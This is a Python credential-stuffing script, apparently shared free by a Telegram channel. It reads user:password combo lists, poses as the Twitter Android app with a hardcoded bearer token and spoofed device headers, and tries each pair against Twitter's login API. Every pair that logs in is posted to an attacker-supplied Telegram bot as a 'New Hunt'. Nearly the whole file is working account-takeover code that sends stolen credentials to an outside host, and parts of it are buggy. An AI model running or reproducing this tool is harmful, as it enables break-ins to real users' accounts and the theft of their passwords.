# - Hey Bro This File Code By : Admin
# - This File Is Free For All !!
# - Syntx : Python3
# -  Channel : @TEAM_1668
# - Thanks You Bro Enjoy
#====================================#

#------------Pips------------#

from requests.api import head


try:
    import requests,secrets
    import os
except ModuleNotFoundError:
    os.system('pip install requests')
    os.system('pip install os')
    os.system('clear')

#-----------Colors-----------#

IBlack="\033[0;90m" # Black
IRed="\033[0;91m" # Red
IGreen="\033[0;92m" # Green
IYellow="\033[0;93m" # Yellow
IBlue="\033[0;94m" # Blue
IPurple="033[0;95m" # Purple
ICyan="\033[0;96m" # Cyan
IWhite="\033[0;97m" # White

combo = input('     '+IBlue+' -Send The Name '+IPurple+'Of The File : ')
myadmin = input('     '+IBlue+' -Send Your '+IPurple+'ID : ')
token = input('     '+IBlue+' -Send Your '+IPurple+'Token  : ')

file=open(combo, 'r')
while True:
    cher = file.readline().split('\n')[0]
    user = cher.split(':')[0]
    pasw = cher.split(':')[1]
    token_url = 'https://api.twitter.com/1.1/guest/activate.json'
    token_hed = {
        'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',
        'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',}
    get_token = requests.post(token_url,headers=token_hed).json()['guest_token']
    url = "https://api.twitter.com/auth/1/xauth_password.json"
    head = {
        'Cache-Control': 'no-store',
        'X-B3-TraceId': 'bc35545e2885cf69',
        'OS-Security-Patch-Level': '2017-10-05',
        'X-Twitter-Client-Flavor': '',
        'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',
        'Accept-Encoding': 'gzip, deflate',
        'X-Twitter-Client-AdID': '143f8c1d-0dab-495e-bdba-6b8f3216d92f',
        'Timezone': 'Asia/Shanghai',
        'X-Twitter-Client-Limit-Ad-Tracking': '0',
        'X-Twitter-Client-DeviceID': 'c0575264c704f9c6',
        'X-Twitter-Client': 'TwitterAndroid',
        'X-Twitter-Client-Language': 'ar-EG',
        'X-Twitter-API-Version': '5',
        'att': '1-p8YDwE1eClUMxxzR8MHgZpnUFyhpILYjFUzExuRI',
        'Optimize-Body': 'true',
        'X-Twitter-Active-User': 'yes',
        'X-Twitter-Client-Version': '8.87.0-release.01',
        'X-Guest-Token': f'{get_token}',
        'X-Client-UUID': 'f55fe15f-b1f4-4406-9dd7-e0eb18b841ec',
        'Accept': 'application/json',
        'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',
        'Accept-Language': 'ar-EG',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '140',
        'Host': 'api.twitter.com',
        'Connection': 'close',
        'Cookie': 'personalization_id=v1_PV0kGHiFp5r175R1KzBEzg==; guest_id=v1%3A161752602861069129'}
    data = {
        'x_auth_identifier': user,
        'x_auth_password': pasw,
        'send_error_codes':'true',
        'x_auth_login_challenge':'1',
        'x_auth_login_verification':'1',
        'ui_metrics': ''}
    re = requests.post(url,headers=head,data=data).text
    if 'oauth_token' in re:
        print(f' Good Acc :  {user}:{pasw} ')
        requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={myadmin}&text=
        - Hey Bro New Hunt !!
        
        == == == == == == == == 
        
        - User / email : {user}
        - Password : {pasw}
        
        == == == == == == == == 
        
        - From : @TEAM_1668 ''')
    else:
        print(f' Bad Acc : {user}:{pasw} ')

#================================================#